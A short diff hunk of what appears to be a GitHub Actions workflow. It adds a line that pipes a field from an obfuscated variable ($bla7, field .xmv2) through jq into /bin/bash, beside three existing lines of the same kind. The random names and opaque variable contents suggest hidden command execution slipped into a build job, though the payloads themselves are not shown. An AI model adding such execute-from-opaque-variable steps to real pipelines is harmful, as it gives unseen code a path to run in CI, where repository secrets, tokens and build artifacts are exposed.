@@ -33,6 +33,7 @@ jobs:
           echo $osu66 | jq -r .o26 | /bin/bash
           printf '%s' "$msjmr7" | jq -r .cs28447 | /bin/bash
           echo $pgfw6641 | jq -r .xkjf40191 | /bin/bash
+          printf '%s' "$bla7" | jq -r .xmv2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
